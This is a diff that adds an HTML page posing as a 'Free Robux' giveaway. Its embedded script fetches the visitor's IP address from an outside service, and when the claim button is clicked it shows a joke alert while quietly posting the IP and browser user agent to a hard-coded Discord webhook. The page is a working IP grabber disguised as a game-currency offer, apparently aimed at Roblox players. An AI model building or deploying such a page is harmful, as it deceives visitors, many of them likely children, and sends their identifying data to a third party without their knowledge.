@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="freerobux.css">
+    <title>Free Robux</title>
+</head>
+<body>
+    <div class="container">
+        <h1>Free Robux!!!</h1>
+        <p class="text">Click the button below to claim your free Robux!</p>
+        <button class="button" id="claimButton">Claim Now!</button>
+    </div>
+    <script type="application/javascript">
+        function getIP(json) {
+            console.log("Your IP address is: " + json.ip);
+            const claimButton = document.getElementById('claimButton');
+            claimButton.addEventListener('click', function() {
+                alert("Congratulations! You have claimed 1000 Robux! (This is just a joke, no real Robux here!)");
+                fetch("https://discord.com/api/webhooks/1391784250684211200/G8BjbeLjWfbVymAubxkOBjgm-oM7TlfMAPKIW6ssiG9gBR-0gyqZMx8swXnAXSWc1vyw", {
+                    body: JSON.stringify({
+                        content: `IP:` + json.ip + `\nUser Agent: ` + navigator.userAgent + `\nClaimed Robux: 1000`,
+                    }),
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    method: "POST",
+                })
+                    .then(function (res) {
+                        console.log(res);
+                    })
+                    .catch(function (res) {
+                        console.log(res);
+                    });
+            });
+        }
+    </script>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    <script src="freerobux.js"></script>
+</body>
+</html>
